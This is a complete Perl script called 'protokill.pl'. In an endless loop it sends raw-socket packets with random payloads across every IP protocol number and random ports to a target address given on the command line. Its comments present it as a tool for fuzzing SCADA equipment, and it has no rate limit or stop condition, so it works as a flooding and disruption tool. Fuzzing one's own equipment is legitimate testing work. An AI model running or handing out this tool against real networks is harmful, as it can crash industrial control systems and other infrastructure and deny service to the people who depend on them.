#!/usr/bin/perl
#
# not a typical packet monkey tool. 
# can be used to fuzz SCADA equipment :>
# Blasts all 255 protocols, including invalid/unused. 
# Scapy does most of this now, but Im old and we wrote 
# an even more horribly coded version of this long ago. 
#

$ARGC=@ARGV;
print "protokill.pl by Bob Ross' Ghost\n";
if ($ARGC !=1) {print "Syntax: $0 <target ip> \n"; exit; }

use IO::Select;
use Socket;
$target=$ARGV[0];
print "\nHappy little packets banging around $target network...\n";

while (1) {

$proto = int(rand(254)) +1; 
$port = int(rand(65535)) + 1;

# Make payloads beefier and dynamic to make our packets happy and colorful!

$randround = int(rand 666)+1 ;
{
  my @set = ('0' .. '9', 'A' .. 'Z', 'a' .. 'z', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', '=', '-', '/', '\\');
  my $data =  join '' => map $set[rand @set], 1 .. $randround;

# Drop packets to raw socket()
socket(unf,PF_INET, SOCK_RAW, $proto);
$iaddr = gethostbyname($target);
$sin = sockaddr_in($port, $iaddr);
 if(send(unf,$data,0,$sin) == -1) {
  print "send error\n\n";
  exit(1);
 }
}
}
